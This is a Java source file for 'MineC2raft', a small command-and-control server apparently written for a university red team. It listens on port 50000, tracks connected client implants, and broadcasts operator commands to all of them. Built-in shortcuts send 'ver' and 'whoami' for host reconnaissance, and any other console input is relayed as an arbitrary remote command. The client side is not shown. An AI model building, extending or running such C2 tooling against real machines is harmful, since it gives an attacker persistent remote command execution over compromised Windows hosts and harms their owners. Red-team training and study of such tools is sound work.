import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.concurrent.CopyOnWriteArrayList;

public class Server {

    //Escape codes or sommn for different colors. 
    private static final String RED = "\u001B[31m";
    private static final String GREEN = "\u001B[32m";
    private static final String YELLOW = "\u001B[33m";
    private static final String RESET = "\u001B[0m";
    
    private static final double VERSION_NUM = 0.02;


    private ServerSocket serverSocket; //UDP socket
    private static final CopyOnWriteArrayList<ClientHandler> clients = new CopyOnWriteArrayList<>();



    public Server() throws IOException{
        serverSocket = new ServerSocket(50000);

    } 
    

    public void runServer() throws IOException {
        System.out.println(GREEN + "Server Created. Listening for clients..." + RESET);

        //thread to handle communications between server any any clients
        Thread connectionThread = new Thread(() -> {
            try {
                while(true) {
                    Socket clientSocket = serverSocket.accept();
                    System.out.println(GREEN + "Client found at: " + YELLOW + clientSocket.getPort() + RESET);

                    ClientHandler handler = new ClientHandler(clientSocket);
                    clients.add(handler);
                    handler.start(); 
                }
            } catch (IOException e) {
                System.out.println(RED + "Client thread stopped." + RESET);
            }
        });
        connectionThread.start();


        // Other thread will read server terminal until quit.
        BufferedReader userReader = new BufferedReader(new InputStreamReader(System.in));
        String userIn = "";
        System.out.println(YELLOW + "Type 'coms' for a list of commands." + RESET);

        while((userIn = userReader.readLine()) != null && !userIn.equals("quit")) {
            
            commandHandler(userIn, null);
        }
        System.out.println(clients.toString());
    }    

    
    public static void commandHandler(String cmd, ClientHandler clientHandler) {
        String reply;
        System.out.println(GREEN + "Start of broadcast: " + RESET + "\n");
            switch(cmd) {
                case "os":
                    reply = "ver";
                    broadcast(reply, null);
                    break;
                case "user":
                    reply = "whoami";
                    broadcast(reply, null);
                    break;
                case "coms": 
                    reply = "               ********** MineC2raft Commands ***********\n\t\t" 
                                + "os: prints the os of the client.\n\t\t"
                                + "user: prints the name of the client.\n\t\t" 
                                + "done: exits the client port\n\t\t" 
                                + "about: about the program.\n\t"  
                                + "       ******************************************\n\n" 
                                + "WINDOWS ONLY\n(Maybe i'll add linux soon) but like lowk you can use a remote terminal \n" 
                                + "Thats all you need to know foo\n\t\t";

                    System.out.println(reply);
                    break;
                case "poop":
                    for(int i = 1; i <= 100; i++) {
                        System.out.println(i + ": Poop");
                    }
                    break;
                case "about":
                    reply = "\n░▒▓ MINEC2RAFT ▓▒░\n" 
                            + "Version: " + VERSION_NUM 
                            + "\nWritten by Austin Hall for RIT's Red Team.\n" 
                            + "For fun too lowk...\n\n" 
                            + "A dud?\n/give @p minecraft:command_block";
                    System.out.println(reply);
                    break;
                case "sockets":
                    System.out.println("Current Connected clients: "+ clients.toString()); // Fix this so that it gives socket numbers
                    System.out.println("\n" + "\u001B[31m" + "End of Command." + "\u001B[0m");
                    break;                
                default: 
                    broadcast(cmd, null);
                    break;  
            }
        
    }

    public static void broadcast(String msg, ClientHandler sender) {

        if(msg == null || msg.trim().isEmpty() || msg.equals("__END__")) {
            return;
        }
        for(ClientHandler client : clients) {
            if (client != sender) {
                client.sendMessage("CMD: " + msg);
            }
        }
    }

}
